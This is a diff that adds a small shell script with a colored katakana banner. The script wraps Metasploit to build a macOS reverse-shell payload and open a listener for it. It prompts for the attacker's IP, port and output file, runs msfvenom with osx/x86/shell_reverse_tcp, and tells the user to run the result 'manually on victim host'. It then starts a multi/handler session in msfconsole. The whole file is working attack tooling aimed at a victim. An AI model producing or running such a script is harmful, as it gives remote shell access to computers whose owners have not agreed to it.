@@ -1,0 +1,32 @@
+#!/bin/sh
+
+# Colors
+blue='\e[1;34'
+cyan='\e[1;36m'
+green='\e[1;34m'
+okegreen='\033[92m'
+lightgreen='\e[1;32m'
+white='\e[1;37m'
+red='\e[1;31m'
+yellow='\e[1;33m'
+
+# Banner
+banner(){
+    clear
+    echo -e ""
+    echo -e "$red    フ$yellowァ$greenッ$cyanク$okegreenユ$lightgreenー"
+    echo -e ""
+}
+
+banner
+echo -e "$white"
+read -p " Your IP : " ip;
+read -p " Port : " port;
+read -p " Output (.dmg/macho) : " out;
+
+banner
+echo -e "$yellow //$white Creating payload"
+msfvenom -p osx/x86/shell_reverse_tcp LHOST=$ip LPORT=$port -f macho > $out
+echo -e "$yellow //$white Payload created, run it manually on victim host"
+echo -e "$yellow //$white Running msfconsole"
+msfconsole -qx "use exploit/multi/handler; set payload osx/x86/shell_reverse_tcp; set lhost $ip; set lport $port; set ExitOnSession false; run -j"
